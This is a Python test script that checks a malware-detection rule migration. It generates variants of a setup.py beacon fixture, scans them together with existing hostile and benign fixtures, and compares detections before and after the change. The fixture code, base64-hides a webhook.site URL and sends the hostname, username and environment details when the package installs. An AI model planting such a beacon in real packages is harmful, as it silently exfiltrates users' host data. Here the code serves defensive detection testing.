#!/usr/bin/env python3
"""Exercise rule changes on neutral paths; never run the probe's network code."""
import argparse, base64, json, shutil, subprocess, textwrap
from pathlib import Path

parser = argparse.ArgumentParser()
parser.add_argument('--scratch', required=True)
parser.add_argument('--prior', required=True)
args = parser.parse_args()
root = Path(__file__).resolve().parents[3]
scratch = Path(args.scratch)
staging = scratch / 'controls'
staging.mkdir(parents=True, exist_ok=True)
endpoint = base64.b64encode(b'https://webhook.site/00000000-0000-0000-0000-000000000001/report').decode()
source = f'''import base64, json, os, socket, getpass
_B = "{endpoint}"
def report():
    try:
        u = base64.b64decode("".join(_B.split())).decode()
        d = {{"host": socket.gethostname(), "user": getpass.getuser(),
             "env": sorted(os.environ.keys())[:40]}}
        import urllib.request
        r = urllib.request.Request(u, data=json.dumps(d).encode())
        urllib.request.urlopen(r, timeout=20).read()
    except Exception:
        pass
report()
from setuptools import setup
setup(name="callback-probe", version="1.0", py_modules=["probe"])
'''
variants = {
 'encoded': (source, True, True, True),
 'renamed': (source.replace('report', 'send_profile').replace(' d ', ' profile ').replace('d).encode', 'profile).encode').replace(' r ', ' req ').replace('urlopen(r,', 'urlopen(req,'), True, True, True),
 'not-called': (source.replace('\nreport()\n','\n'), False, False, True),
 'not-sent': (source.replace('urllib.request.urlopen(r, timeout=20).read()', 'print(r)'), False, False, True),
 'other-request': (source.replace('urllib.request.urlopen(r, timeout=20).read()', 'urllib.request.urlopen("https://example.invalid/status").read()'), False, False, True),
 'other-body': (source.replace('json.dumps(d)', 'json.dumps({"ok": True})'), False, False, False),
 'plain-url': (source.replace('base64.b64decode("".join(_B.split())).decode()', '"https://webhook.site/00000000-0000-0000-0000-000000000001/report"'), False, True, True),
 'env-values': (source.replace('os.environ.keys()', 'os.environ.values()'), True, True, False),
 'no-identity': (source.replace('"host": socket.gethostname(), "user": getpass.getuser(),', '"status": "ready",'), False, False, True),
 'direct': (textwrap.dedent(source.split('def report():\n')[1].split('\nreport()')[0]), False, True, True),
 'explicit-get': (source.replace('data=json.dumps(d).encode())', 'data=json.dumps(d).encode(), method="GET")'), True, True, True),
 'dynamic-method': (source.replace('def report():', 'options = {"method": "GET"}\ndef report():').replace('data=json.dumps(d).encode())', 'data=json.dumps(d).encode(), **options)'), True, True, True),
 'mention': ('from setuptools import setup\nURL="https://webhook.site/00000000-0000-0000-0000-000000000001/report"\nsetup(name="demo",version="1.0")\n', False, False, False),
}
paths = []
expectations = {}
for name, (text, hostile, send, names) in variants.items():
    p = staging / name / ('module.py' if name == 'direct' else 'setup.py')
    p.parent.mkdir(exist_ok=True)
    p.write_text(text)
    paths.append(p)
    expectations[str(p)] = {'hostile': hostile, 'send': send, 'names': names, 'post': name not in {'mention', 'explicit-get', 'dynamic-method'}}
# Independent, pre-existing attack and benign controls outside this sample batch.
external = [
 'testdata/hostile/setup-urlretrieve-exec/setup.py',
 'testdata/hostile/edison-response-exec-control/setup.py',
 'testdata/hostile/bound-python-temp-stager/setup.py',
 'testdata/hostile/kcli-controls/aws-urllib.py',
 'testdata/benign/kcli-controls/aws-urllib-overwritten.py',
 'testdata/benign/setup-unused-download-helper/setup.py',
 'testdata/benign/setup-verified-library-download/setup.py',
 'testdata/hostile/supply-chain-controls/import-time-oob-beacon.py',
]
for i, original in enumerate(external):
    p = staging / ('existing-' + str(i)) / Path(original).name
    p.parent.mkdir(exist_ok=True)
    shutil.copyfile(root / original, p)
    paths.append(p)

def scan(traits, output):
    result = subprocess.run(['cleave', '--traits-dir', str(traits), '--format', 'json', *map(str, paths)], capture_output=True, text=True)
    (scratch / output).write_text(result.stdout)
    if result.returncode:
        raise SystemExit(result.stderr)
    pending = result.stdout
    decoder = json.JSONDecoder()
    reports = {}
    while pending.strip():
        report, end = decoder.raw_decode(pending.lstrip())
        pending = pending.lstrip()[end:]
        for f in report['files']:
            reports[f['path']] = f
    return reports

before = scan(Path(args.prior), 'controls-before.json')
after = scan(root, 'controls-after.json')
mapping = json.loads(Path(__file__).with_name('migration.json').read_text())['mapping']
old_hostile = 'objectives/supply-chain/recon-exfil/callback::setup-py-module-scope-oob-callback'
new_hostile = 'objectives/exfiltration/stealer/system-info/identity::setup-py-silent-encoded-host-report'
suspicious = 'objectives/exfiltration/stealer/system-info/identity::python-urllib-oob-host-identity-body'
send_id = 'micro-behaviors/communications/http/client/exchange::python-urllib-json-host-identity-send'
names_id = 'micro-behaviors/communications/http/request/json::urllib-json-body-environment-names'
failures = []
summary = []
for p in paths:
    key = str(p)
    old = {mapping.get(t['id'], t['id']): t['crit'] for t in before[key].get('traits', [])}
    new = {t['id']: t['crit'] for t in after[key].get('traits', [])}
    losses = sorted(set(old) - set(new))
    # Unconsumed OOB OR wrappers may be pruned by the engine; their
    # canonical endpoint atom must remain visible.
    wrappers = {'micro-behaviors/communications/url/host/oob::oob-endpoint-any',
                'micro-behaviors/communications/url/host/oob::webhook-site'}
    unexpected = set(losses) - {old_hostile, suspicious} - wrappers
    if set(losses) & wrappers and 'micro-behaviors/communications/url/host/oob::webhook-site-reference' not in new:
        failures.append(f'{p}: lost underlying OOB endpoint reference')
    if unexpected:
        failures.append(f'{p}: lost {sorted(unexpected)}')
    for ident in set(new) - set(old):
        if new[ident] >= 5 and ident != new_hostile:
            failures.append(f'{p}: unexpected new hostile finding {ident}')
    for ident in set(old) & set(new):
        if old[ident] != new[ident]:
            failures.append(f'{p}: severity changed for {ident}')
    if key in expectations:
        e = expectations[key]
        for label, ident in [('hostile', new_hostile), ('send', send_id), ('names', names_id)]:
            if (ident in new) != e[label]:
                failures.append(f'{p}: {label} expected {e[label]}, got {ident in new}')
    summary.append({'case': str(p.relative_to(staging)), 'before_hostile': sum(v==5 for v in old.values()), 'after_hostile': sum(v==5 for v in new.values()), 'lost': losses, 'added': sorted(set(new)-set(old))})
(scratch / 'controls-summary.json').write_text(json.dumps(summary, indent=2)+'\n')
if failures:
    raise SystemExit('\n'.join(failures))
print(f'{len(paths)} controls passed, including {len(external)} existing fixtures; no unexplained detection loss')
